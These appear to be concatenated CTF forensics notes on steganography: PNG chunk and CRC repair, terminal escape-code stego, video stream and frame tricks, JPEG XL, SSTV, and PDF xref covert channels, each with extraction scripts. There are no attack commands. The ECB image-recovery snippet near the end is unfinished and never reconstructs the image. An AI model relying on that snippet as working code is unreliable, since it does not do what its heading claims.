**Key insight:** Regular PNG viewers display only the first frame of an APNG. Hidden data can be in any subsequent frame. The `acTL` chunk signals APNG format; `fcTL`/`fdAT` chunks contain additional frame data.

---

## PNG Height/CRC Manipulation for Hidden Content (H4ckIT CTF 2016)

PNG images with incorrect IHDR dimensions hide content below the visible area. Brute-force the correct height by matching the IHDR CRC.

```python
import struct, zlib

def fix_png_height(filename):
    with open(filename, 'rb') as f:
        data = bytearray(f.read())

    # IHDR chunk starts at offset 8 (after 8-byte PNG signature)
    # IHDR layout: width(4) height(4) bitdepth(1) colortype(1) ...
    ihdr_start = 8 + 4  # skip signature + chunk length
    ihdr_data = data[ihdr_start:ihdr_start + 17]  # "IHDR" + 13 bytes
    stored_crc = struct.unpack('>I', data[ihdr_start + 17:ihdr_start + 21])[0]

    width = struct.unpack('>I', ihdr_data[4:8])[0]

    # Brute-force correct height
    for h in range(1, 4096):
        test_ihdr = ihdr_data[:8] + struct.pack('>I', h) + ihdr_data[12:]
        if zlib.crc32(test_ihdr) & 0xffffffff == stored_crc:
            print(f"Correct height: {h} (was: {struct.unpack('>I', ihdr_data[8:12])[0]})")
            data[ihdr_start + 8:ihdr_start + 12] = struct.pack('>I', h)
            with open('fixed_' + filename, 'wb') as f:
                f.write(data)
            return h

    # If no CRC match, the CRC itself may need fixing after setting height
    # Manual approach: set height larger, fix CRC
    return None
```

**Key insight:** PNG stores image dimensions in the IHDR chunk with a CRC. If the height is reduced, data below the visible area is hidden but still present in IDAT chunks. Brute-forcing the height against the stored CRC reveals the correct dimensions. If the CRC was also modified, try increasing the height and recalculating the CRC.

---

## PNG Chunk Reordering (0xFun 2026)

**Pattern (Spectrum):** Invalid PNG has chunks out of order.

**Fix:** Reorder to: `signature + IHDR + (ancillary chunks) + (all IDAT in order) + IEND`.

```python
import struct

with open('broken.png', 'rb') as f:
    data = f.read()

sig = data[:8]
chunks = []
pos = 8
while pos < len(data):
    length = struct.unpack('>I', data[pos:pos+4])[0]
    chunk_type = data[pos+4:pos+8]
    chunk_data = data[pos+8:pos+8+length]
    crc = data[pos+8+length:pos+12+length]
    chunks.append((chunk_type, length, chunk_data, crc))
    pos += 12 + length

# Sort: IHDR first, IEND last, IDATs in original order
ihdr = [c for c in chunks if c[0] == b'IHDR']
idat = [c for c in chunks if c[0] == b'IDAT']
iend = [c for c in chunks if c[0] == b'IEND']
other = [c for c in chunks if c[0] not in (b'IHDR', b'IDAT', b'IEND')]

with open('fixed.png', 'wb') as f:
    f.write(sig)
    for typ, length, data, crc in ihdr + other + idat + iend:
        f.write(struct.pack('>I', length) + typ + data + crc)
```

---

## File Format Overlays (0xFun 2026)

**Pattern (Pixel Rehab):** Archive appended after PNG IEND, but magic bytes overwritten with PNG signature.

**Detection:** Check bytes after IEND for appended data. Compare magic bytes against known formats.

```python
# Find IEND, check what follows
data = open('image.png', 'rb').read()
iend_pos = data.find(b'IEND') + 8  # After IEND + CRC
trailer = data[iend_pos:]
# Replace first 6 bytes with 7z magic if they match PNG sig
if trailer[:4] == b'\x89PNG':
    trailer = b'\x37\x7a\xbc\xaf\x27\x1c' + trailer[6:]
    open('hidden.7z', 'wb').write(trailer)
```

---

## Nested PNG with Iterating XOR Keys (VuwCTF 2025)

**Pattern (Matroiska):** Each PNG layer XOR-encrypted with incrementing keys ("layer2", "layer3", etc.).

**Identification:** Matryoshka/nested hints. Try incrementing key patterns for recursive extraction.

---

## GIF Frame Differential + Morse Code (BaltCTF 2013)

**Pattern:** Animated GIF contains hidden dots visible only when comparing frames against originals. Dots encode Morse code.

```bash
# Extract frames from animated GIF
convert animated.gif frame_%03d.gif

# Compare each frame against its base using ImageMagick
for i in $(seq 1 100); do
    compare -fuzz 10% -compose src stego_$i.gif original_$i.gif diff_$i.gif
done

# Inspect diff images — dots appear at specific positions
# Map dot patterns to Morse: small dot = dit, large dot = dah
```

**Key insight:** `compare -fuzz 10%` reveals subtle single-pixel modifications invisible to the eye. The diff images show isolated dots whose timing/spacing encodes Morse code. Decode dots → dashes/dots → letters → flag.

---

## GZSteg + Spammimic Text Steganography (VolgaCTF 2013)

**Pattern:** Data hidden within gzip compression metadata, decoded through spammimic.com.

1. Apply GZSteg patches to gzip 1.2.4 source, compile, extract with `gzip --s` flag
2. Extracted text resembles spam email — submit to [spammimic.com](https://www.spammimic.com/) decoder
3. Decoded output is the flag

**Key insight:** GZSteg exploits redundancy in the gzip DEFLATE compression format to embed covert data. The extracted payload often uses a second steganographic layer (spammimic encodes data as innocuous-looking spam text). Look for `.gz` files larger than expected for their content.

---

## Spreadsheet Frequency Analysis Binary Recovery (Sharif CTF 2016)

When spreadsheet cells contain numbers with varying frequencies, the frequency rank may encode binary data:

1. **Count occurrences** of each unique value
2. **Sort by frequency** to create a mapping: value -> frequency rank (0-255)
3. **Replace each cell** with its frequency rank to recover raw bytes

```python
from collections import Counter

# Count frequency of each value
freq = Counter(all_cell_values)

# Create mapping: value -> index in frequency-sorted list
sorted_vals = sorted(freq.keys(), key=lambda x: freq[x])
mapping = {v: i for i, v in enumerate(sorted_vals)}

# Apply mapping to recover binary
binary = bytes(mapping[v] for v in all_cell_values)
# Result is typically an ELF binary or image
```

**Key insight:** 256 unique values suggest byte-level encoding. The frequency distribution of the mapped output should resemble typical binary file statistics.

---

## Kitty Terminal Graphics Protocol Decoding (BSidesSF 2026)

**Pattern (kitty):** A file contains Kitty terminal graphics protocol escape sequences (`ESC_G`) that embed zlib-compressed RGB image data in base64-encoded chunks.

**Protocol format:**
```text
\x1b_Ga=T,q=2,f=24,o=z,m=1,s=WIDTH,v=HEIGHT;BASE64DATA\x1b\\
```

**Header fields:**
- `a=T` — action: transmit
- `q=2` — quiet mode (suppress responses)
- `f=24` — format: 24-bit RGB
- `o=z` — compression: zlib
- `m=1` — more chunks follow; `m=0` — final chunk
- `s=WIDTH,v=HEIGHT` — image dimensions (present in first chunk only)

**Decoding workflow:**
```python
import re
import base64
import zlib
from PIL import Image

# Read the raw file
data = open('kitty_output.bin', 'rb').read()

# Extract all base64 payloads from escape sequences
# Pattern: \x1b_G...;BASE64\x1b\\
chunks = re.findall(rb'\x1b_G([^;]*);([^\x1b]*)\x1b\\\\', data)

# Parse dimensions from first chunk's header
first_header = chunks[0][0].decode()
width = int(re.search(r's=(\d+)', first_header).group(1))
height = int(re.search(r'v=(\d+)', first_header).group(1))

# Concatenate all base64 payloads
b64_data = b''.join(chunk[1] for chunk in chunks)
compressed = base64.b64decode(b64_data)
raw_rgb = zlib.decompress(compressed)

# Reconstruct image
img = Image.frombytes('RGB', (width, height), raw_rgb)
img.save('recovered.png')
```

**Key insight:** Kitty graphics protocol is a modern terminal image display mechanism. The data is invisible when viewed in non-Kitty terminals but can be decoded from the raw escape sequences. Multi-chunk messages (`m=1` followed by continuation chunks) must be concatenated before base64 decoding.

**Detection:** Binary file containing `\x1b_G` sequences. `strings` output shows base64-like data interspersed with escape codes. Challenge mentions "kitty", "terminal graphics", or "meow".

**References:** BSidesSF 2026 "kitty"

---

## ANSI Escape Sequence Steganography in Terminal Art (BSidesSF 2026)

**Pattern (roar):** Flag text is interleaved between ANSI color escape codes and Unicode braille characters in terminal art. When rendered in a terminal, the art displays normally while the flag characters are invisible (zero-width or same-color-as-background). However, the flag is extractable by stripping all escape sequences and non-ASCII characters.

**Extraction:**
```python
import re

data = open('art.txt', 'rb').read().decode('utf-8', errors='replace')

# Strip ANSI escape sequences
clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', data)

# Extract only printable ASCII (flag characters)
flag_chars = [c for c in clean if 32 <= ord(c) <= 126 and c not in ' \t\n']

# Or: filter out braille unicode block (U+2800-U+28FF) and other non-ASCII
flag_chars = [c for c in clean if ord(c) < 128 and c.isprintable() and c != ' ']

print(''.join(flag_chars))
```

**Alternative approach — diff against rendered output:**
```bash
# Render with ANSI codes, capture visible text
cat art.txt | col -b > rendered.txt
# Compare raw vs rendered to find hidden characters
```

**Key insight:** ANSI escape sequences control terminal colors, cursor position, and text attributes. Flag characters inserted between escape codes are technically present in the file but invisible when rendered because they're either: (a) the same color as the background, (b) followed by a cursor-move-back sequence, or (c) overwritten by subsequent characters. Raw byte extraction bypasses all rendering tricks.

**Detection:** File with many `\x1b[` sequences (ANSI codes), Unicode braille characters (U+2800-U+28FF), and unexpectedly large file size for the visible content. Challenge mentions "terminal", "art", "ANSI", or shows ASCII/Unicode art.

**References:** BSidesSF 2026 "roar"

---

### Autostereogram / Magic Eye Solving (BSidesSF 2026)

**Pattern (stereotype):** Challenge image is an autostereogram (Magic Eye). The hidden 3D content (flag text) is revealed by viewing with crossed/divergent eyes or programmatically via layer difference.

**Programmatic solve (GIMP or Python):**
1. Duplicate the image as a second layer
2. Set the top layer's blending mode to "Difference"
3. Slide the top layer horizontally by the repeat width (~100 pixels)
4. The hidden depth pattern appears as bright lines on a dark background

```python
from PIL import Image
import numpy as np

img = np.array(Image.open('stereogram.png'))
shift = 100  # Repeat width — try values 80-120
diff = np.abs(img[:, shift:].astype(int) - img[:, :-shift].astype(int))
Image.fromarray(diff.astype(np.uint8)).save('revealed.png')
```

**Finding the shift value:** The repeat width is the horizontal distance between identical vertical strips. Autocorrelate a single row: `np.correlate(row, row, mode='full')` — the first peak after center is the shift.

**Key insight:** Autostereograms encode depth via horizontal pixel displacement relative to a repeating pattern. Subtracting the image from a shifted copy of itself cancels the repeating background and reveals the depth variation as the flag text.

**When to recognize:** Image has a repeating texture/pattern, challenge mentions "eyes", "seeing", "3D", "magic", or "stereogram".

**References:** BSidesSF 2026 "stereotype"

---

### Two-Layer Byte+Line Interleaving (BSidesSF 2026)

**Pattern (seeing-double):** Two PNG files are interleaved at the byte level into a single file. After byte-level deinterlacing, the resulting images have their scanlines interleaved, requiring a second round of line-level deinterlacing.

**Step 1 — Byte deinterleave:**
```python
data = open('interleaved.ppnngg', 'rb').read()
file_a = bytes(data[i] for i in range(0, len(data), 2))  # Even bytes
file_b = bytes(data[i] for i in range(1, len(data), 2))  # Odd bytes
# file_a and file_b are valid PNGs
```

**Step 2 — Line deinterleave (if needed):**
```python
from PIL import Image
import numpy as np

img = np.array(Image.open('file_a.png'))
# Even lines form one sub-image, odd lines form another
sub1 = img[0::2]  # Lines 0, 2, 4, ...
sub2 = img[1::2]  # Lines 1, 3, 5, ...
Image.fromarray(sub1).save('final_a.png')
Image.fromarray(sub2).save('final_b.png')
```

**Key insight:** The two-layer interleaving (first bytes, then scanlines) means simple deinterleaving at one level produces garbled results. Recognize multi-layer interleaving by: (1) deinterleaved file is a valid image but content looks "striped" or has alternating line artifacts, (2) file extension hints (`.ppnngg` = two PNGs interleaved).

**Detection:** File has double-extension or unusual extension. `file` command may identify it as data or as one format. Even/odd byte extraction produces valid file headers (e.g., both halves start with PNG magic `89 50 4E 47`).

**References:** BSidesSF 2026 "seeing-double"

---

### Multi-Stream Video Container Steganography (BSidesSF 2026)

**Pattern (ads):** An MP4 video container holds multiple video streams. The default (stream 0:0) plays normally, but a second stream (0:1) contains the flag. Most video players only show the first/default stream. The secondary stream uses AV1 codec which has poor support in many tools, adding friction.

```bash
# Detect multiple streams
ffprobe -hide_banner flag.mp4
# Look for Stream #0:1 — a second video stream

# Extract second stream to its own file
ffmpeg -i flag.mp4 -map 0:1 -c copy second_stream.mp4

# Or extract just the first frame from stream 1
ffmpeg -i flag.mp4 -map 0:1 -frames:v 1 flag.jpg
```

**Key insight:** MP4/MKV containers can hold multiple video, audio, and subtitle tracks. Most players default to stream 0:0. Always run `ffprobe` or `mediainfo` to enumerate ALL streams. The `-map 0:N` flag in ffmpeg selects specific streams. VLC can also switch tracks via Video → Video Track menu.

**When to recognize:** Challenge provides a video file where the visible content seems irrelevant or is a red herring. `ffprobe` shows multiple `Stream` entries. Check metadata fields like `handler_name` for hints (e.g., "CTF Trickery").

**Detection checklist:**
1. `ffprobe -hide_banner file.mp4` — count Stream lines
2. `mediainfo file.mp4` — check track count
3. VLC → Video → Video Track → try all tracks

**References:** BSidesSF 2026 "ads"

---

## Progressive PNG Layered XOR Decryption (OpenCTF 2016)

**Pattern (Progressive Encryption):** PNG contains standard `IDAT` chunk (coarse first scan) plus custom `scRT` chunks. Each `scRT` chunk is XOR-encrypted with a multi-byte key. Decrypting reveals another `IDAT` chunk plus another `scRT`, forming nested layers.

1. Extract the custom `scRT` chunk data from the PNG
2. Use xortool to guess the XOR key (expected most frequent byte: `\xFF` for image data):
```bash
# Extract scRT chunk contents
python3 -c "
import struct
with open('image.png', 'rb') as f:
    data = f.read()
# Parse PNG chunks, find scRT
pos = 8  # skip PNG signature
while pos < len(data):
    length = struct.unpack('>I', data[pos:pos+4])[0]
    chunk_type = data[pos+4:pos+8]
    if chunk_type == b'scRT':
        with open('layer.bin', 'wb') as out:
            out.write(data[pos+8:pos+8+length])
    pos += 12 + length
"

# Guess XOR key
xortool -c ff layer.bin
# Output: key = 'nacho'
```

3. Decrypt and split: the decrypted data contains a valid `IDAT` chunk followed by another `scRT`
4. Repeat for each layer until all `scRT` chunks are decrypted
5. Reassemble: concatenate PNG header + all decrypted `IDAT` chunks + `IEND`

**Layer keys in this challenge:** `nacho`, `savages`, `president`, `kilobits`, `monkey`, `butler`

**Shortcut:** Open the raw PNG bytes as a raw image in GraphBitStreamer (32 bpp, width matching original). Weak XOR encryption preserves visual patterns (like ECB-encrypted images), making the flag readable without full decryption.

**Key insight:** Custom PNG chunks (non-standard 4-letter types) often contain hidden data. The PNG spec allows arbitrary ancillary chunks — parsers ignore unknown types. When multiple layers use different XOR keys, each must be cracked independently using frequency analysis. The shortcut works because XOR with a short repeating key preserves large-scale pixel patterns, similar to ECB mode's visual leakage.


# stego-advanced-2

# CTF Forensics - Advanced Steganography (Part 2)

See also: [stego-advanced.md](stego-advanced.md) for audio steganography (FFT frequency domain, DTMF, SSTV, LSB audio, musical notes, metadata encoding, waveform binary, spectrogram QR) and whitespace/archive encoding.

## Table of Contents
- [Video Frame Accumulation for Hidden Image (ASIS CTF Finals 2013)](#video-frame-accumulation-for-hidden-image-asis-ctf-finals-2013)
- [Reversed Audio Hidden Message (ASIS CTF Finals 2013)](#reversed-audio-hidden-message-asis-ctf-finals-2013)
- [Video Frame Averaging for Hidden Content (SECCON 2015)](#video-frame-averaging-for-hidden-content-seccon-2015)
- [JPEG XL TOC Permutation Steganography (BSidesSF 2026)](#jpeg-xl-toc-permutation-steganography-bsidessf-2026)
- [Arnold's Cat Map Image Descrambling (Nuit du Hack 2017)](#arnolds-cat-map-image-descrambling-nuit-du-hack-2017)
- [High-Resolution SSTV Custom FM Demodulation (PlaidCTF 2017)](#high-resolution-sstv-custom-fm-demodulation-plaidctf-2017)
- [MJPEG Extra Bytes After FFD9 Steganography (PoliCTF 2017)](#mjpeg-extra-bytes-after-ffd9-steganography-polictf-2017)
- [EXIF Zlib Data with Non-Default LSB Pixel Pattern (ASIS CTF Finals 2017)](#exif-zlib-data-with-non-default-lsb-pixel-pattern-asis-ctf-finals-2017)
- [PDF Cross-Reference Table Covert Channel (SEC-T CTF 2017)](#pdf-cross-reference-table-covert-channel-sec-t-ctf-2017)
- [ANSI Escape Code Steganography in Network Capture (Square CTF 2017)](#ansi-escape-code-steganography-in-network-capture-square-ctf-2017)
- [Pixel-Wise ECB Deduplication for Image Recovery (BackdoorCTF 2017)](#pixel-wise-ecb-deduplication-for-image-recovery-backdoorctf-2017)

---

## Video Frame Accumulation for Hidden Image (ASIS CTF Finals 2013)

**Pattern:** Video shows small images (icons, shapes) flashing briefly at different screen positions. Individual frames appear random, but the positions trace out a hidden pattern (QR code, text, image) when all frames are composited together.

**Extraction workflow:**

1. Extract individual frames from the video:
```bash
ffmpeg -i challenge.mp4 -vsync 0 frames/frame_%04d.png
```

2. Composite all frames by taking the maximum (or union) of all pixel values:
```python
from PIL import Image
import os

frames_dir = 'frames'
frame_files = sorted(os.listdir(frames_dir))

# Load first frame as base
base = Image.open(os.path.join(frames_dir, frame_files[0])).convert('L')

# Accumulate: take maximum pixel value across all frames
import numpy as np
accumulated = np.array(base, dtype=np.float64)
for f in frame_files[1:]:
    frame = np.array(Image.open(os.path.join(frames_dir, f)).convert('L'), dtype=np.float64)
    accumulated = np.maximum(accumulated, frame)

result = Image.fromarray(accumulated.astype(np.uint8))
result.save('accumulated.png')
```

3. Alternative: convert to GIF and delete the black background frame in GIMP to see all positions overlaid.

4. Clean up the revealed pattern (e.g., QR code) — select foreground, grow/shrink selection, flood fill, scale to expected dimensions (e.g., 21x21 for Version 1 QR):
```bash
# Scan for QR code
zbarimg accumulated.png
```

**Key insight:** When a video shows objects flashing at seemingly random positions, composite all frames together. The positions themselves encode the hidden data — each frame contributes one pixel/cell to a larger image. Convert to GIF for frame-by-frame inspection in GIMP, or use PIL/NumPy to take per-pixel maximum across all frames.

---

## Reversed Audio Hidden Message (ASIS CTF Finals 2013)

**Pattern:** Audio track (standalone or extracted from video) sounds garbled or unintelligible. Playing it in reverse reveals speech, numbers, or other meaningful content.

**Extraction and reversal:**
```bash
# Extract audio from video
ffmpeg -i challenge.mp4 -vn -acodec pcm_s16le audio.wav

# Reverse audio
sox audio.wav reversed.wav reverse
# Or: ffmpeg -i audio.wav -af areverse reversed.wav

# Play to hear hidden message
play reversed.wav
```

**Alternative:** Open in Audacity -> Effect -> Reverse. Listen for speech, numbers, or encoded data.

**Key insight:** Reversed audio is one of the simplest audio steganography techniques. If audio sounds like garbled speech with recognizable cadence, try reversing it first. The hidden content is often a numeric string (e.g., an MD5 hash) or instructions for the next step of the challenge. Check both the audio and video tracks of multimedia files independently.

---

## Video Frame Averaging for Hidden Content (SECCON 2015)

Extract content hidden across multiple video frames by temporal averaging:

```python
import numpy as np
from PIL import Image
import glob

frames = sorted(glob.glob('frames/*.png'))
N = len(frames)

# Accumulate frames as floating-point to preserve precision
acc = np.zeros(np.array(Image.open(frames[0])).shape, dtype=np.float64)
for f in frames:
    acc += np.array(Image.open(f), dtype=np.float64) / N

# Convert back to uint8
result = Image.fromarray(np.round(acc).astype(np.uint8))
result.save('averaged.png')
```

Use histogram equalization to enhance contrast if the averaged image is faint:

```python
from PIL import ImageOps
enhanced = ImageOps.equalize(result.convert('L'))
enhanced.save('enhanced.png')
```

**Key insight:** Content obscured by motion, noise, or rapid changes across frames becomes visible when averaged. Extract frames with `ffmpeg -i video.mp4 frames/%04d.png` first. Works for hidden QR codes, text, and watermarks.

---

## JPEG XL TOC Permutation Steganography (BSidesSF 2026)

**Pattern (image-progress):** JPEG XL's Table of Contents (TOC) supports a permutation field that reorders how AC groups (progressive scan tiles) are stored in the file. The convergence order during progressive decoding — which 256x256 tiles appear first as you truncate the file at increasing offsets — encodes the flag.

**Decoding approach:**
1. **Progressive truncation:** Truncate the JXL file at increasing byte offsets (e.g., every 1KB)
2. **Decode each truncation:** Use `djxl` to decode each truncated file
3. **Measure tile convergence:** Compare each decoded truncation against the full decode to determine which 256x256 tiles have converged (match the final image)
4. **Read convergence order:** The order in which tiles reach their final state spells the flag

```python
import subprocess
import numpy as np
from PIL import Image

# Full decode as reference
subprocess.run(['djxl', 'flag.jxl', 'full.png'])
full = np.array(Image.open('full.png'))
h, w = full.shape[:2]
tile_size = 256
tiles_x = (w + tile_size - 1) // tile_size
tiles_y = (h + tile_size - 1) // tile_size

# Track when each tile converges
converged = {}
jxl_data = open('flag.jxl', 'rb').read()

for offset in range(1000, len(jxl_data), 1000):
    # Write truncated file
    with open('/tmp/trunc.jxl', 'wb') as f:
        f.write(jxl_data[:offset])

    # Try to decode (may fail for very short truncations)
    result = subprocess.run(['djxl', '/tmp/trunc.jxl', '/tmp/trunc.png'],
                          capture_output=True)
    if result.returncode != 0:
        continue

    partial = np.array(Image.open('/tmp/trunc.png'))

    # Check which tiles match the full decode
    for ty in range(tiles_y):
        for tx in range(tiles_x):
            tile_id = ty * tiles_x + tx
            if tile_id in converged:
                continue
            y0, y1 = ty * tile_size, min((ty+1) * tile_size, h)
            x0, x1 = tx * tile_size, min((tx+1) * tile_size, w)
            if np.array_equal(partial[y0:y1, x0:x1], full[y0:y1, x0:x1]):
                converged[tile_id] = offset

# Sort tiles by convergence order
order = sorted(converged.items(), key=lambda x: x[1])
flag_chars = [chr(tile_id) for tile_id, _ in order]
print('Flag:', ''.join(flag_chars))
```

**Alternative — direct TOC extraction:**
```bash
# Modified djxl with debug prints can extract TOC permutation directly
# Look for the permutation array in the JXL frame header
# The TOC permutation maps: stored_order[i] -> logical_group[i]
# Inverse gives: logical_group -> stored_order (convergence priority)
```

**JPEG XL progressive structure:**
- **DC groups:** Low-frequency data (converges first, gives blurry preview)
- **AC groups:** High-frequency detail, stored per 256x256 tile
- **TOC permutation:** Reorders the storage of AC groups — controls which tiles get detail first during progressive loading
- **Lehmer code:** JXL encodes the permutation as a Lehmer code sequence in the TOC header

**Key insight:** JPEG XL's TOC permutation is a legitimate feature for progressive rendering optimization (prioritize important image regions). As a steganographic channel, it's invisible — the fully decoded image looks identical regardless of permutation. The hidden data is only revealed by observing the progressive convergence order, which requires truncating the file at multiple points.

**Detection:** JXL file where progressive rendering shows tiles appearing in an unusual order (e.g., spelling text). Challenge mentions "progressive", "convergence", or "order matters".

**References:** BSidesSF 2026 "image-progress"

---

## Arnold's Cat Map Image Descrambling (Nuit du Hack 2017)

Arnold's Cat Map is a chaotic area-preserving transformation that is periodic — iterating it enough times restores the original image. When an image appears scrambled with a noise-like pattern but retains the correct dimensions and color histogram, suspect a Cat Map scramble.

```python
from PIL import Image
import numpy as np

img = np.array(Image.open('scrambled.png'))
N = img.shape[0]  # Must be square

def arnold_cat_map(image, n):
    """Apply Arnold's Cat Map transformation"""
    result = np.zeros_like(image)
    for x in range(n):
        for y in range(n):
            nx = (2*x + y) % n
            ny = (x + y) % n
            result[nx, ny] = image[x, y]
    return result

# Iterate until original image reappears (period depends on N)
current = img.copy()
for i in range(1, N * N):
    current = arnold_cat_map(current, N)
    Image.fromarray(current).save(f'frame_{i:04d}.png')
    # Check if we've returned to original (or visually inspect)
```

**Key insight:** Arnold's Cat Map is periodic with period dividing `3*N` for most image sizes. Iterating the forward transform eventually restores the original. For large images, compute the period analytically via `lcm` of matrix eigenvalue orders in `Z/NZ` rather than brute-forcing all iterations.

**Detection:** Square image that looks like uniformly scrambled noise but has a plausible color distribution. Challenge mentions "cat", "Arnold", "chaotic", or "permutation".

---

## High-Resolution SSTV Custom FM Demodulation (PlaidCTF 2017)

When a WAV file contains an SSTV signal at higher-than-standard sample rate (e.g., 96kHz vs standard 2.3kHz bandwidth), standard SSTV decoders fail on the high-frequency content. Use custom FM demodulation.

```python
# Method 1: GNU Radio
# Hilbert Transform -> Quadrature Demod -> low-pass filter

# Method 2: Manual arccos + derivative (handles clipping)
import numpy as np
from scipy.io import wavfile

rate, data = wavfile.read('signal.wav')
# Normalize to [-1, 1]
data = data / np.max(np.abs(data))
# Clamp to valid arccos range
data = np.clip(data, -0.999, 0.999)
# Instantaneous frequency via arccos derivative
phase = np.arccos(data)
freq = np.diff(phase) * rate / (2 * np.pi)
# Map frequency to pixel intensity (1500-2300Hz typical SSTV range)
pixels = np.clip((freq - 1500) / 800 * 255, 0, 255).astype(np.uint8)
```

**Key insight:** Standard SSTV decoders (QSSTV, MMSSTV) assume standard bandwidth (~2.3kHz). High-sample-rate recordings may contain wider-bandwidth signals that these decoders truncate. Manual FM demodulation via `arccos` + differentiation (avoiding Hilbert transform artifacts on clipped signals) recovers the full frequency range.

**Detection:** WAV file at unusually high sample rate (48kHz, 96kHz) where standard SSTV decoders produce garbled or partial output. Spectrogram shows frequency-modulated signal structure.

---

## MJPEG Extra Bytes After FFD9 Steganography (PoliCTF 2017)

MJPEG video frames that contain extra bytes after the JPEG end-of-image marker (FFD9) hide data in the padding.

```python
# Split MJPEG into individual frames
frames = open('video.mjpeg', 'rb').read().split(b'\xff\xd8')

hidden = b""
for frame in frames:
    if not frame: continue
    frame = b'\xff\xd8' + frame
    # Find JPEG EOI marker
    eoi = frame.find(b'\xff\xd9')
    if eoi != -1:
        extra = frame[eoi + 2:]  # bytes after FFD9
        if extra:
            hidden += extra

print(hidden.decode(errors='ignore'))
```

**Key insight:** JPEG decoders stop at the FFD9 (End of Image) marker and ignore trailing bytes. In MJPEG streams, each frame is a complete JPEG — appending 1+ extra bytes after each frame's FFD9 creates a covert channel invisible to video players.

**Detection:** MJPEG file where individual frames are slightly larger than expected. `binwalk` on raw MJPEG may show repeated JPEG headers. Hex dump shows non-zero data between FFD9 and the next FFD8.

---

## EXIF Zlib Data with Non-Default LSB Pixel Pattern (ASIS CTF Finals 2017)

A JPG's EXIF `ImageDescription` field contains zlib-compressed then base64-encoded data. Detect via the `\x78\x9C` zlib magic bytes after base64 decoding. After decompression, the hint references the Stegano Python library with a `triangular_numbers` generator for non-sequential pixel selection (positions 1, 3, 6, 10, ...).

```bash
# Step 1: Extract EXIF ImageDescription
exiftool -ImageDescription image.jpg
# Or:
python3 -c "
from PIL import Image
img = Image.open('image.jpg')
desc = img._getexif()[270]  # Tag 270 = ImageDescription
print(repr(desc))
"

# Step 2: Base64-decode, then zlib-decompress
python3 -c "
import base64, zlib
desc = '<exif_description_value>'
decoded = base64.b64decode(desc)
print(zlib.decompress(decoded).decode())
"

# Step 3: Extract hidden data using Stegano with triangular_numbers generator
python3 -c "
from stegano import lsb
from stegano.lsb import generators
print(lsb.reveal('image.png', generators.triangular_numbers()))
"
```

**Key insight:** Standard LSB tools (zsteg, stegsolve) fail with non-sequential pixel patterns. The Stegano library supports custom generators; always check EXIF metadata for hints about which generator to use. The `\x78\x9C` bytes are the deflate magic — a reliable indicator of zlib-compressed content.

---

## PDF Cross-Reference Table Covert Channel (SEC-T CTF 2017)

PDF xref table entries normally use generation number 0 (live objects) or 65535 (free/deleted). Non-standard generation numbers encode data: read each non-zero, non-65535 generation number in order, interpret as hex -> ASCII characters (may need to reverse the string).

```bash
# Inspect raw xref entries with pdf-parser.py
python pdf-parser.py --stats suspicious.pdf
python pdf-parser.py --type /XRef suspicious.pdf

# Or read the raw xref table directly
python3 -c "
with open('suspicious.pdf', 'rb') as f:
    data = f.read().decode('latin-1')

# Find xref section
xref_idx = data.rfind('xref')
xref_section = data[xref_idx:xref_idx+2000]
gen_numbers = []
for line in xref_section.splitlines():
    parts = line.split()
    if len(parts) == 3 and parts[2] in ('n', 'f'):
        gen = int(parts[1])
        if gen not in (0, 65535):
            gen_numbers.append(gen)

# Convert hex values to ASCII
flag = bytes.fromhex(''.join(f'{g:02x}' for g in gen_numbers)).decode()
print(flag)
# Also try reversed: print(flag[::-1])
"
```

**Key insight:** PDF xref generation numbers are rarely validated by viewers, making them a low-noise steganographic channel. Any value other than 0 (live) or 65535 (deleted) is suspicious. Use `pdf-parser.py --raw` to inspect raw xref entries without parser normalization.

---

## ANSI Escape Code Steganography in Network Capture (Square CTF 2017)

Network packet data contains ANSI escape sequences (color codes, cursor movement). Raw hex and strings tools show garbled output. Pipe raw bytes through a terminal pager (`more`, `less -r`) to render the escape codes — the flag becomes visible as colored or positioned text.

```bash
# Extract raw TCP stream payload
tshark -r capture.pcap -q -z "follow,tcp,raw,0" | \
  tail -n +7 | tr -d '\n' | xxd -r -p > stream.bin

# Render ANSI escape codes (simplest approach)
more stream.bin
# or
cat stream.bin | less -r

# Alternative: extract data field directly
tshark -r capture.pcap -T fields -e data | xxd -r -p | more
```

ANSI escape patterns to recognize:
- `\x1b[<n>m` — color/attribute codes
- `\x1b[<row>;<col>H` — cursor position
- `\x1b[<n>A/B/C/D` — cursor movement (up/down/right/left)

**Key insight:** ANSI escape sequences encode visual information only revealed by terminal rendering. Always try `more` or `less -r` if content looks like terminal output. Cursor-positioning sequences can spell out text that only appears correct on a terminal.

---

## Pixel-Wise ECB Deduplication for Image Recovery (BackdoorCTF 2017)

An image is encrypted by replacing each pixel's value with a hash (ECB-mode pixel encryption). Since the pixel value space is small (256 for grayscale, or limited palette), precompute a hash-to-pixel lookup table and remap each hash value back to the original pixel.

```python
from PIL import Image
import hashlib

img = Image.open('encrypted.png').convert('L')  # Grayscale
pixels = list(img.getdata())

# Build lookup table: hash(pixel) -> pixel value
# The encryption maps each unique pixel value to a unique hash
# Since the space is small (256 values), enumerate all possible originals
lookup = {}
for original_val in range(256):
    # Determine which hash function was used (MD5, SHA1, etc.)
    h = hashlib.md5(bytes([original_val])).hexdigest()
    lookup[h] = original_val

# Reconstruct: each "pixel" in encrypted image is actually a hash index
# For palette-based images, map color index -> original pixel
unique_colors = list(set(pixels))
color_map = {}
for i, color in enumerate(unique_colors):
    # ECB: identical pixels -> identical cipher values
    # Count unique values to confirm small space
    pass

# Simpler: if encrypted values are small integers (0-255 remapped)
# The structure is preserved — just find the right permutation
reconstructed = Image.new('L', img.size)
# Map each encrypted value back using the lookup
```

**Key insight:** ECB-mode pixel encryption leaks structure via identical ciphertexts for identical plaintext pixels. With only 256 possible grayscale values, the full lookup table is trivial to precompute. The encrypted image will show the same shapes/edges as the original — recognizable structure confirms ECB mode.


# stego-advanced

# CTF Forensics - Advanced Steganography

See also: [stego-advanced-2.md](stego-advanced-2.md) for video frame techniques, JPEG XL TOC permutation, Arnold's Cat Map, SSTV FM demodulation, MJPEG steganography, EXIF/Stegano pixel patterns, PDF xref covert channels, ANSI escape code stego, and ECB image recovery.

## Table of Contents
- [FFT Frequency Domain Steganography (Pragyan 2026)](#fft-frequency-domain-steganography-pragyan-2026)
- [SSTV Red Herring + LSB Audio Stego (0xFun 2026)](#sstv-red-herring--lsb-audio-stego-0xfun-2026)
- [DotCode Barcode via SSTV (0xFun 2026)](#dotcode-barcode-via-sstv-0xfun-2026)
- [DTMF Audio Decoding](#dtmf-audio-decoding)
